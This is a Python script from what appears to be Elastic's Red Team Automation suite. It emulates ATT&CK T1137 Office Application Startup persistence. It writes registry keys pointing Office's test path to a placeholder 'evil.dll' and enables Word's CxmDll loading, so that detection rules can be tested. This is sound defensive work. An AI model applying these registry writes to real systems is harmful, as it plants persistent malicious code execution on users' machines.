# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License;
# you may not use this file except in compliance with the Elastic License.

# Name: Office Application Startup
# RTA: office_application_startup.py
# ATT&CK: T1137
# Description: Modifies the registry to persist a DLL on Office Startup.

import sys

from . import common


@common.requires_os(common.WINDOWS)
def main(dll_location="c:\\windows\\temp\\evil.dll"):
    # Write evil dll to office test path:
    subkey = "Software\\Microsoft\\Office Test\\Special\\Perf"
    common.write_reg(common.HKCU, subkey, "", dll_location)
    common.write_reg(common.HKLM, subkey, "", dll_location)

    # winreg = common.get_winreg()
    # set_sleep_clear_key(winreg.HKEY_CURRENT_USER, subkey, "", dll_location, winreg.REG_SZ, 3)
    # set_sleep_clear_key(winreg.HKEY_LOCAL_MACHINE, subkey, "", dll_location, winreg.REG_SZ, 3)

    # Turn on Office 2010 WWLIBcxm persistence
    subkey = "Software\\Microsoft\\Office\\14.0\\Word"
    common.write_reg(common.HKCU, subkey, "CxmDll", 1, common.DWORD)

    # set_sleep_clear_key(winreg.HKEY_CURRENT_USER, subkey, "CxmDll", 1, winreg.REG_DWORD, 0)

    return common.SUCCESS


if __name__ == "__main__":
    exit(main(*sys.argv[1:]))
